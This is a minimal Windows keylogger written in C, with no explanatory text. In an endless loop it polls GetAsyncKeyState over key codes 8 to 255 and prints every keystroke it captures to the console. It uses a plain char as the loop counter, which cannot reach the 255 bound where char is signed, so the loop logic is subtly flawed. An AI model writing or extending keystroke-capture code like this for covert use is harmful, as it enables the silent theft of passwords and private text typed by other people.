#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main(int argc, char const *argv[])
{

    char i;

    while(1){
        for (i = 8; i <= 255; i++)
        {
            if(GetAsyncKeyState(i) == -32767){
                printf("%c", i);
            }
        }
        
    }

    return 0;
}
